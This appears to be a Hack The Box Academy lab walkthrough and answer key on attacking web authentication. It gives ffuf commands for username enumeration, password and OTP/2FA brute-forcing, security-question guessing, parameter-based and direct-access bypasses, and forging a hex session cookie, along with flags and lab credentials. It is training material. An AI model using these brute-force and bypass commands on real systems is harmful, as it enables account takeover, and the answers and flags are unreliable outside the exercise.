
| Section | Question Number | Answer |
| --- | --- | --- |
| Enumerating Users | Question 1 | cookster |
| Brute-Forcing Passwords | Question 1 | Password Reuse |
| Brute-Forcing Passwords | Question 2 | Ramirez120992 |
| Brute-Forcing Password Reset Tokens | Question 1 | One-Time Reset Token |
| Brute-Forcing Password Reset Tokens | Question 2 | \-w |
| Brute-Forcing Password Reset Tokens | Question 3 | 1000000 |
| Brute-Forcing Password Reset Tokens | Question 4 | HTB{36DA098385E641D54E1B2750721D816E} |
| Brute-Forcing 2FA Codes | Question 1 | HTB{9837B33A1EF678C380ADDF7EF8A517DE} |
| Vulnerable Password Reset | Question 1 | Manchester |
| Vulnerable Password Reset | Question 2 | HTB{D4740B1801D9880FF70DE227A54309F0} |
| Authentication Bypass via Direct Access | Question 1 | HTB{913ab2d84b8db21854c696dee1f1db68} |
| Authentication Bypass via Parameter Modification | Question 1 | HTB{63593317426484EA6D270C2159335780} |
| Attacking Session Tokens | Question 1 | Entropy |
| Attacking Session Tokens | Question 2 | HTB{d1f5d760d130f7dd11de93f0b393abda} |
| Skills Assessment | Question 1 | HTB{d86115e037388d0fa29280b737fd9171} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Enumerating Users

## Question 1

### "Enumerate a valid user on the web application. Provide the username as the answer."

After spawning the target machine and visiting its root web page, students need to attempt signing with dummy credentials, using the Web Developers Tools Network tab (`Ctrl + Shift + E`) to inspect the request:

![[HTB Solutions/CBBH/z. images/37c27357080c6a794d8cf3e5106620ee_MD5.jpg]]

The error message the server returns, "Unknown user.", exposes that the username provided does not exist, regardless of the password's validity; this allows enumerating valid usernames. Additionally, students will discover that `username` and `password` are the parameters used by the form to send data to the server:

![[HTB Solutions/CBBH/z. images/2c0681d4275ad11061a85eb37702ef57_MD5.jpg]]

Therefore, students need to use `ffuf` to enumerate valid usernames, finding only one to be valid:

Code: shell

```shell
ffuf -w /opt/useful/SecLists/Usernames/xato-net-10-million-usernames.txt -u http://STMIP:STMPO/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=123" -fr "Unknown user."
```

```
┌─[eu-academy-5]─[10.10.14.81]─[htb-ac-413848@htb-2rcbi2srbd]─[~]
└──╼ [★]$ ffuf -w /opt/useful/SecLists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.54.176:58188/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=123" -fr "Unknown user."

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://94.237.54.176:58188/index.php
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=123
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Unknown user.
________________________________________________

{hidden}                [Status: 200, Size: 3271, Words: 754, Lines: 103, Duration: 1508ms]
```

Answer: `cookster`

# Brute-Forcing Passwords

## Question 1

### "What is one prominent issue with passwords?"

`{hidden}` is one prominent issue with passwords.

Answer: `Password Reuse`

# Brute-Forcing Passwords

## Question 2

### "What is the password of the user 'admin'?"

After spawning the target machine and visiting its root web page, students will discover a banner revealing the password policy enforced by the web application for accounts:

![[HTB Solutions/CBBH/z. images/cd45a548afe4f2b40f9060dfc965186b_MD5.jpg]]

To increase the success rate of brute-forcing the password of the `admin` user, students need to modify `rockyou.txt` so that it only contains passwords compliant with the web application's password policy:

Code: shell

```shell
sudo grep '[[:upper:]]' /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > rockyouTrimmed.txt
```

```
┌─[eu-academy-5]─[10.10.14.81]─[htb-ac-413848@htb-2rcbi2srbd]─[~]
└──╼ [★]$ sudo grep '[[:upper:]]' /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > rockyouTrimmed.txt

grep: /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt: binary file matches
```

Afterward, students need to attempt signing with dummy credentials, using the Web Developers Tools Network tab (`Ctrl + Shift + E`) to inspect the request:

![[HTB Solutions/CBBH/z. images/4567c9145a05c67240450f6643c6cc59_MD5.jpg]]

Students will discover that the server returns the error message "Invalid username or password." when provided with invalid credentials, in addition to `username` and `password` being the parameters used by the form to send data to the server:

![[HTB Solutions/CBBH/z. images/59683da71f08bcd456b84f69384d8a90_MD5.jpg]]

Therefore, students need to use `ffuf` to brute-force the password of the `admin` user, making use of the modified `rockyou.txt` wordlist:

Code: shell

```shell
ffuf -w rockyouTrimmed.txt -u http://STMIP:STMPO/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username or password." -t 60
```

```
┌─[eu-academy-5]─[10.10.14.81]─[htb-ac-413848@htb-2rcbi2srbd]─[~]
└──╼ [★]$ ffuf -w rockyouTrimmed.txt -u http://94.237.58.102:49349/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username or password." -t 60

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://94.237.58.102:49349/index.php
 :: Wordlist         : FUZZ: /home/htb-ac-413848/rockyouTrimmed.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=admin&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid username or password.
________________________________________________

{hidden}           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 92ms]
```

Answer: `Ramirez120992`

# Brute-Forcing Password Reset Tokens

## Question 1

### "On what do password recovery functionalities provided by web applications typically rely to allow users to recover their accounts?"

Password recovery functionalities provided by web applications typically rely on a `{hidden}` to allow users to recover their accounts.

Answer: `One-Time Reset Token`

# Brute-Forcing Password Reset Tokens

## Question 2

### "Which flag of seq pads numbers by prepending zeros to make them the same length?"

The `{hidden}` flag of `seq` pads numbers by prepending zeros to make them of equal length.

Answer: `-w`

# Brute-Forcing Password Reset Tokens

## Question 3

### "How many possible values are there for a 6-digit OTP?"

There are `{hidden}` possible values for a 6-digit OTP.

Answer: `1000000`

# Brute-Forcing Password Reset Tokens

## Question 4

### "Takeover another user's account on the target system to obtain the flag."

After spawning the target machine and visiting the `/reset.php` web page, students need to submit a password reset request for the user `admin`:

![[HTB Solutions/CBBH/z. images/03641e779940aea7faaac0b427cec377_MD5.jpg]]

The web application then provides a link to the `/reset_password.php` web page, which, as per the reset email provided in the section, accepts the OTP in the GET parameter `token`:

![[HTB Solutions/CBBH/z. images/6bd7c03797111d8c052a42ffd79a325e_MD5.jpg]]

When not providing the `token` parameter or sending an incorrect OTP in it, the server returns the error message "The provided token is invalid":

![[HTB Solutions/CBBH/z. images/6efefb9e2aa85b16a60c3b6b365f6c0c_MD5.jpg]]

Using `sed`, students need to create a wordlist containing numbers starting with 0 up until 9999:

Code: shell

```shell
seq -w 0 9999 > tokens.txt
```

```
┌─[eu-academy-5]─[10.10.14.81]─[htb-ac-413848@htb-2rcbi2srbd]─[~]
└──╼ [★]$ seq -w 0 9999 > tokens.txt
```

Afterward, students need to use `ffuf` to brute-force all valid OTPs belonging to user-requested password resets using the `seq`\-generated wordlist. Students will find one valid OTP (`3622` in here):

Code: shell

```shell
ffuf -w tokens.txt -u http://STMIP:STMPO/reset_password.php?token=FUZZ -fr "The provided token is invalid" -t 60
```

```
┌─[eu-academy-5]─[10.10.14.81]─[htb-ac-413848@htb-2rcbi2srbd]─[~]
└──╼ [★]$ ffuf -w tokens.txt -u http://94.237.58.102:33611/reset_password.php?token=FUZZ -fr "The provided token is invalid" -t 60

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://94.237.58.102:33611/reset_password.php?token=FUZZ
 :: Wordlist         : FUZZ: /home/htb-ac-413848/tokens.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: The provided token is invalid
________________________________________________

3622                    [Status: 200, Size: 2920, Words: 596, Lines: 92, Duration: 96ms]
```

After that, students need to use the found OTP as the value for the `token` GET parameter of the `/reset_password.php` web page, finding the OTP belonging to the user `admin`; students need to reset the password of the user:

![[HTB Solutions/CBBH/z. images/362042512d045897e475bd5e7727efc2_MD5.jpg]]

Subsequently, students need to navigate to `/index.php` and sign in:

![[HTB Solutions/CBBH/z. images/de58ba7df715321e8290d08f86e83675_MD5.jpg]]

Once signed in as `admin`, students will attain the flag.

Answer: `HTB{36da098385e641d54e1b2750721d816e}`

# Brute-Forcing 2FA Codes

## Question 1

### "Brute-force the admin user's 2FA code on the target system to obtain the flag."

After spawning the target machine and visiting its root web page, students need to sign in with the credentials `admin:admin`:

![[HTB Solutions/CBBH/z. images/31bb4ad7f0f45bd6cf5dd85a3a9608a3_MD5.jpg]]

The web application enforces 2FA, requesting a 4-digit OTP:

![[HTB Solutions/CBBH/z. images/a5a2e9a4dfe0973860a1da8c84a36e68_MD5.jpg]]

Students need to attempt providing an incorrect OTP using the Web Developers Tools Network tab (`Ctrl + Shift + E`) to inspect the request:

![[HTB Solutions/CBBH/z. images/0421b67da79fa3ebce5bc6b3ede5cae0_MD5.jpg]]

Students will discover that the server returns the error message "Invalid 2FA Code." when provided with an invalid OTP, in addition to `otp` being the parameter used by the form to send data to the server:

![[HTB Solutions/CBBH/z. images/47cf70271ac2cf2dd049091c9e8fec05_MD5.jpg]]

Because students have signed in with valid credentials, the backend server created a login session; therefore, students need to copy its cookie from the `Cookie` header of the request:

![[HTB Solutions/CBBH/z. images/0275298b32998cb8149b1d64d4478aeb_MD5.jpg]]

Afterward, using `sed`, students need to create a wordlist containing numbers starting with 0 up until 9999:

Code: shell

```shell
seq -w 0 9999 > tokens.txt
```

```
┌─[eu-academy-5]─[10.10.14.81]─[htb-ac-413848@htb-2rcbi2srbd]─[~]
└──╼ [★]$ seq -w 0 9999 > tokens.txt
```

Students then need to use `ffuf` to brute-force the valid 2FA code, making use of the `seq`\-generated wordlist and the `PHPSESSID` cookie value:

Code: shell

```shell
ffuf -w tokens.txt -u http://STMIP:STMPO/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "otp=FUZZ" -fr "Invalid 2FA Code." -b "PHPSESSID=kl6e44c5285rin68kn3mt1mv7a" -t 60
```

```
┌─[eu-academy-5]─[10.10.14.81]─[htb-ac-413848@htb-a6lye3msi7]─[~]
└──╼ [★]$ ffuf -w tokens.txt -u http://94.237.49.212:40137/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "otp=FUZZ" -fr "Invalid 2FA Code." -b "PHPSESSID=kl6e44c5285rin68kn3mt1mv7a" -t 60

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://94.237.49.212:40137/2fa.php
 :: Wordlist         : FUZZ: /home/htb-ac-413848/tokens.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: PHPSESSID=kl6e44c5285rin68kn3mt1mv7a
 :: Data             : otp=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid 2FA Code.
________________________________________________

4765                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 94ms]
4740                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 99ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Using the first valid 2FA code, students need to submit it to continue the sign-in process:

![[HTB Solutions/CBBH/z. images/de350d9aa0e51c4a2ecd2f94a3e1fe0b_MD5.jpg]]

Students will attain the flag once signed in as the user `admin`.

Answer: `HTB{9837b33a1ef678c380addf7ef8a517de}`

# Vulnerable Password Reset

## Question 1

### "Which city is the admin user from?"

After spawning the target machine, students need to navigate to the `/reset.php` web page and attempt resetting the password of the user `admin`:

![[HTB Solutions/CBBH/z. images/3bfc0e5c8b9c50b207bc42b3b5eece4f_MD5.jpg]]

The web application then asks a security question, prompting for the user's birth city; students need to attempt providing an incorrect answer, using the Web Developers Tools Network tab (`Ctrl + Shift + E`) to inspect the request:

![[HTB Solutions/CBBH/z. images/f14326980b1a17ace803b9bb38aac990_MD5.jpg]]

Students will discover that the server returns the error message "Incorrect response." when provided with an incorrect answer, in addition to `security_response` being the parameter used by the form to send data to the server:

![[HTB Solutions/CBBH/z. images/9a19bc217508362019d699050e40f3a8_MD5.jpg]]

Because students have signed in with valid credentials, the backend server created a login session; therefore, students need to copy its cookie from the `Cookie` header of the request:

![[HTB Solutions/CBBH/z. images/fd6cee9228ebaa737f053b0267630c53_MD5.jpg]]

Because the security question's answer is the name of a city, students need to download [world-cities.csv](https://raw.githubusercontent.com/datasets/world-cities/master/data/world-cities.csv) to use it as a wordlist:

Code: shell

```shell
wget https://raw.githubusercontent.com/datasets/world-cities/master/data/world-cities.csv
```

```
┌─[eu-academy-5]─[10.10.14.81]─[htb-ac-413848@htb-a6lye3msi7]─[~]
└──╼ [★]$ wget https://raw.githubusercontent.com/datasets/world-cities/master/data/world-cities.csv

--2024-06-07 14:50:47--  https://raw.githubusercontent.com/datasets/world-cities/master/data/world-cities.csv
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 992726 (969K) [text/plain]
Saving to: ‘world-cities.csv’

<SNIP>
```

Per the question's hint, the user `admin` is from the UK. Therefore, students need to modify the wordlist only to contain cities in the UK:

Code: shell

```shell
cat world-cities.csv | grep 'United Kingdom' | cut -d "," -f 1 > UK_Cities.txt
```

```
┌─[eu-academy-5]─[10.10.14.81]─[htb-ac-413848@htb-a6lye3msi7]─[~]
└──╼ [★]$ cat world-cities.csv | grep 'United Kingdom' | cut -d "," -f 1 > UK_Cities.txt
```

Afterward, students need to use `ffuf` to brute-force the valid security answer, making use of the modified wordlist and the `PHPSESSID` cookie value:

Code: shell

```shell
ffuf -w UK_Cities.txt -u http://STMIP:STMPO/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "security_response=FUZZ" -fr "Incorrect response." -b "PHPSESSID=5crasoe3ebnhnb8biknkcon5co" -t 60
```

```
┌─[eu-academy-5]─[10.10.14.81]─[htb-ac-413848@htb-a6lye3msi7]─[~]
└──╼ [★]$ ffuf -w UK_Cities.txt -u http://94.237.54.176:34629/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "security_response=FUZZ" -fr "Incorrect response." -b "PHPSESSID=5crasoe3ebnhnb8biknkcon5co" -t 60

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://94.237.54.176:34629/security_question.php
 :: Wordlist         : FUZZ: /home/htb-ac-413848/UK_Cities.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: PHPSESSID=5crasoe3ebnhnb8biknkcon5co
 :: Data             : security_response=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Incorrect response.
________________________________________________

{hidden}              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 16ms]
```

Answer: `Manchester`

# Vulnerable Password Reset

## Question 2

### "Reset the admin user's password on the target system to obtain the flag."

Using the city's name obtained from the previous question, students need to submit it in the form at `/security_question.php`. Subsequently, students need to provide a new password:

![[HTB Solutions/CBBH/z. images/489f90c5e6439ff5ce612472418dee5a_MD5.jpg]]

The web application returns a message indicating that the password has been reset successfully:

![[HTB Solutions/CBBH/z. images/087a16cedab129ba4487dc70e3d65970_MD5.jpg]]

Subsequently, students need to navigate to the `/index.php` web page and sign in with the new credentials:

![[HTB Solutions/CBBH/z. images/38fa0df1685d8f62963bc0de14a8b879_MD5.jpg]]

Once signed in as the admin user, students will attain the flag.

Answer: `HTB{d4740b1801d9880ff70de227a54309f0}`

# Authentication Bypass via Direct Access

## Question 1

### "Apply what you learned in this section to bypass authentication to obtain the flag."

After spawning the target machine, students need to visit the `/admin.php` web page, intercept the request with `Burp`, and send it to `Repeater` to inspect the response. Although the server returns a 302 status code, the content of the admin page is leaked:

![[HTB Solutions/CBBH/z. images/2aa911a4698f3481a75bf67a9a026c1c_MD5.jpg]]

Students will obtain the flag by checking the `Render` tab of the `Response` panel (or by finding it on line 127).

Answer: `HTB{913ab2d84b8db21854c696dee1f1db68}`

# Authentication Bypass via Parameter Modification

## Question 1

### "Apply what you learned in this section to bypass authentication."

After spawning the target machine and visiting its root web page, students need to sign in with the credentials `htb-stdnt:AcademyStudent!` and intercept the request with `Burp` to send it to `Repeater`:

![[HTB Solutions/CBBH/z. images/555b2586ca7505e2530946bdae10aa87_MD5.jpg]]

Students will notice that the response performs a redirect to the `/admin.php` web page, with the value of the GET parameter `user_id` being 183:

![[HTB Solutions/CBBH/z. images/e38abf0d0a107b2a79260c39acc46a2d_MD5.jpg]]

Following the redirection, students will notice that although the `PHPSESSID` (unauthenticated session) cookie gets deleted, the web application still allows authenticated access due to the presence of the `user_id` parameter. However, the user with the ID 184 does not possess privileges to load admin data, as indicated by the message (starting with "Could not load admin data.") on line 128:

![[HTB Solutions/CBBH/z. images/432d4ba8f56b091ef04e21762deea8b9_MD5.jpg]]

Students then need to use `sed` to create a wordlist containing IDs starting with 1 up until 1000:

Code: shell

```shell
seq 1 1000 > user_ids.txt
```

```
┌─[eu-academy-5]─[10.10.14.81]─[htb-ac-413848@htb-a6lye3msi7]─[~]
└──╼ [★]$ seq 1 1000 > user_ids.txt
```

Afterward, students need to use `ffuf` to brute-force all valid user IDs, using the `seq`\-generated wordlist and the (substring of the) error message "Could not load admin data.". Students will find that the user with ID 372 has administrative privileges:

Code: shell

```shell
ffuf -w user_ids.txt -u http://STMIP:STMPO/admin.php?user_id=FUZZ -fr "Could not load admin data."
```

```
┌─[eu-academy-5]─[10.10.14.81]─[htb-ac-413848@htb-a6lye3msi7]─[~]
└──╼ [★]$ ffuf -w user_ids.txt -u http://94.237.49.212:56652/admin.php?user_id=FUZZ -fr "Could not load admin data."

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://94.237.49.212:56652/admin.php?user_id=FUZZ
 :: Wordlist         : FUZZ: /home/htb-ac-413848/user_ids.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Could not load admin data
________________________________________________

372                     [Status: 200, Size: 14465, Words: 4165, Lines: 429, Duration: 18ms]
:: Progress: [1000/1000] :: Job [1/1] :: 61 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Students then need to use the ID 372 for the GET parameter `user_id` of the `/admin.php` web page to attain the flag.

Answer: `HTB{63593317426484ea6d270c2159335780}`

# Attacking Session Tokens

## Question 1

### "A session token can be brute-forced if it lacks sufficient what?"

A session token can be brute-forced if it lacks sufficient `{hidden}`.

Answer: `Entropy`

# Attacking Session Tokens

## Question 2

### "Obtain administrative access on the target to obtain the flag."

After spawning the target machine and visiting its root web page, students need to sign in with the credentials `htb-stdnt:AcademyStudent!`:

![[HTB Solutions/CBBH/z. images/34f2d8fc045b0bead5ef4f825b8fec32_MD5.jpg]]

When using `Cookie Editor` to inspect the cookie generated by the backend server, students will discover that it consists only of hexadecimal characters:

![[HTB Solutions/CBBH/z. images/66859736fbcf44aed93a00c4186f4a72_MD5.jpg]]

Therefore, students need to use `xxd` to convert it to plain text, noticing that the value for the `role` is `user`:

Code: shell

```shell
echo -n '757365723d6874622d7374646e743b726f6c653d75736572' | xxd -r -p
```

```
┌─[eu-academy-5]─[10.10.14.233]─[htb-ac-413848@htb-tfffdu6uyo]─[~]
└──╼ [★]$ echo -n '757365723d6874622d7374646e743b726f6c653d75736572' | xxd -r -p

user=htb-stdnt;role=user
```

Students need to alter the role to be `admin` instead and use `xxd` to convert the plain text into hexadecimal:

Code: shell

```shell
echo -n 'user=htb-stdnt;role=admin' | xxd -p
```

```
┌─[eu-academy-5]─[10.10.14.233]─[htb-ac-413848@htb-evly17edjb]─[~]
└──╼ [★]$ echo -n 'user=htb-stdnt;role=admin' | xxd -p

757365723d6874622d7374646e743b726f6c653d61646d696e
```

Afterward, students need to delete the old `session` cookie and create a new one with the altered role; otherwise, `Cookie Editor` will error out:

![[HTB Solutions/CBBH/z. images/a4144f78b533b82d55e2227694937252_MD5.jpg]]

After refreshing the page, students will attain the flag.

Answer: `HTB{d1f5d760d130f7dd11de93f0b393abda}`

# Skills Assessment

## Question 1

### "Obtain the flag."

After spawning the target machine and visiting its root web page, students need to navigate to `/login.php` and then click on 'Register a new account':

![[HTB Solutions/CBBH/z. images/2efb53b4452de94fc4b35f65c1790dbd_MD5.jpg]]

![[HTB Solutions/CBBH/z. images/0da502d54de8b59abfbbc7f7c836a99a_MD5.jpg]]

Afterward, students need to attempt registering an account with a password such as 'password':

![[HTB Solutions/CBBH/z. images/e0e535a27d79cf40d8e7ddf024e629d2_MD5.jpg]]

Students will discover that the web application disallows registration and provides its required password policy:

![[HTB Solutions/CBBH/z. images/20e0ef83dc49699c7d3d00dd5ab3a119_MD5.jpg]]

Therefore, students need to modify `rockyou.txt` so that it only contains passwords compliant with the web application's password policy:

```shell
sudo grep '[[:upper:]]' /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{12}' > rockyouTrimmed.txt
```
```
┌─[eu-academy-5]─[10.10.14.233]─[htb-ac-413848@htb-evly17edjb]─[~]
└──╼ [★]$ sudo grep '[[:upper:]]' /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{12}' > rockyouTrimmed.txt

grep: /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt: binary file matches
```

Using any password from the created wordlist (such as 'iydgTvmujl6f'), students need to register an account:

![[HTB Solutions/CBBH/z. images/932b91eb44ece321af6ac9f52e3e1dc4_MD5.jpg]]

Subsequently, students need to sign in, noticing that the web application redirects to `/profile.php`; however, the user account lacks administrative privileges:

![[HTB Solutions/CBBH/z. images/e9ee01aef1f18c1a911a46ad6e744f15_MD5.jpg]]

When attempting to sign in with dummy credentials, students will discover that the error message returned by the server is 'Unknown username or password.' (students need to inspect the request sent to notice that `username` and `password` are the two POST parameters used by the form to send data to the server):

![[HTB Solutions/CBBH/z. images/d6af763b0b4dbd2172b475e712f6e251_MD5.jpg]]

![[HTB Solutions/CBBH/z. images/64f5e43fcbedb86f0086447cc82046f8_MD5.jpg]]

However, when providing a valid username but an incorrect password, the error message returned is "Invalid credentials.":

![[HTB Solutions/CBBH/z. images/694ea2cda72a2443c0c94c3ba1c16fc8_MD5.jpg]]

![[HTB Solutions/CBBH/z. images/fb6a0240f80d2066642ca420229ae23a_MD5.jpg]]

This differing error message behavior allows for the enumeration of valid usernames and brute-forcing of passwords (given that rate-limiting is not enforced).

Thus, students first need to use `ffuf` to enumerate valid usernames, finding the only one to be `gladys`:

```shell
ffuf -w /opt/useful/SecLists/Usernames/xato-net-10-million-usernames.txt -u http://STMIP:STMPO/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=123" -fr "Unknown username or password."
```
```shell
┌─[eu-academy-5]─[10.10.14.233]─[htb-ac-413848@htb-evly17edjb]─[~]
└──╼ [★]$ ffuf -w /opt/useful/SecLists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.63.201:51492/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=123" -fr "Unknown username or password."

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://94.237.63.201:51492/login.php
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=123
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Unknown username or password.
________________________________________________

gladys                  [Status: 200, Size: 4344, Words: 680, Lines: 91, Duration: 17ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Subsequently, students need to use `ffuf` to brute-force the password of the user `gladys` (making use of the modified `rockyou.txt` wordlist), finding it to be `dWinaldasD13`:

```shell
ffuf -w rockyouTrimmed.txt -u http://STMIP:STMPO/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Invalid credentials." -t 60
```
```
┌─[eu-academy-5]─[10.10.14.233]─[htb-ac-413848@htb-evly17edjb]─[~]
└──╼ [★]$ ffuf -w rockyouTrimmed.txt -u http://94.237.63.201:51492/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Invalid credentials." -t 60

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://94.237.63.201:51492/login.php
 :: Wordlist         : FUZZ: /home/htb-ac-413848/rockyouTrimmed.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=gladys&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid credentials.
________________________________________________

dWinaldasD13            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 97ms]
```

Students then need to sign in using the credentials `gladys:dWinaldasD13`:

![[HTB Solutions/CBBH/z. images/5cc89ce95e820521f4ad526f1bf00096_MD5.jpg]]

The web application prompts for a 2FA OTP before completing the sign-in process:

![[HTB Solutions/CBBH/z. images/5a2abb69347f9ad8b2c62c029287804a_MD5.jpg]]

The OTP cannot be brute-forced. However, students need to intercept the request to `/2fa.php`, change the endpoint to `/profile.php`, and not follow the redirection to `/2fa.php`. Although the server returns a 302 status code, the content of `/profile.php` belonging to `gladys`, an administrator user, is leaked:

![[HTB Solutions/CBBH/z. images/c88fd3918ae155985810323f3460e0b0_MD5.jpg]]

Students will obtain the flag by checking the `Render` tab of the `Response` panel (or finding it on line 72).

Answer: `HTB{d86115e037388d0fa29280b737fd9171}`